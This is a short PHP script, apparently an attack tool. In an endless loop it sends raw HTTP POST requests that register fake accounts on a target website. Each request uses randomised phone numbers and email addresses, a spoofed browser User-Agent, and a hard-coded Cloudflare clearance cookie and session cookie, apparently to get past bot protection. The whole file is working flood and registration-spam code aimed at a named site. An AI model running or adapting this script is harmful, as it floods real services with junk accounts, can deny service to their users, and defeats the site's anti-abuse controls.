$data = str_repeat("A", 10000);
$ip = $_GET['ip'];
$host = $_GET['host'];
$path = "/";
$post_data = 'lead_campaign=&country=AS&state=Eastern+District&first_name=daskuhdui&last_name=huihduahsduihas&phone=8716' .rand(0, 99999999). '&email=asughduihiu' .rand(0, 99999999). '%40tutanota.com&password=1q2w3e&con_password=1q2w3e&type_of_account=9&referer_code=&ib_code=&terms=on&reg_type=0';

while(1)
	{
	$filename = $ip.'.txt';

	if (file_exists($filename)) 
	{
		$ip = file_get_contents($filename);
	}
	$socket = fsockopen($host, 80, $errno, $errstr, 15);
	$http = "POST {$path} HTTP/1.1\r\n";
	$http .= "Host: {$host}\r\n";
	$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
	$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$http .= "Content-length: " . strlen($post_data) . "\r\n";
	$http .= "Connection: close\r\n";
	$cookie = "__cfduid=d4f9a7ad1fbbda06f3775688e9ca479181544621882; qtrans_front_language=en; PHPSESSID=o6kfvobo658ai5nm3jtjp92crf; TawkConnectionTime=0; cf_clearance=6dcb270751cd34a9e503ee388d5a694631d6c571-1544635283-1800-150; __tawkuuid=e::4xincome.com::D25c8oebRs6GszGOoC0qyC+D3aWMPfuFff5vTuXtFdLhB4Ka4gI8pQksWEr3miUK::2";
	$http .= "Cookie: " .$cookie. "\r\n\r\n";
	$http .= $post_data . "\r\n";
	
	fwrite($socket, $http);
	
	#$contents = "";
	#while (!feof($socket)) {
	#	$contents.= fgets($socket, 4096);
	#}

	fclose($socket);
	}
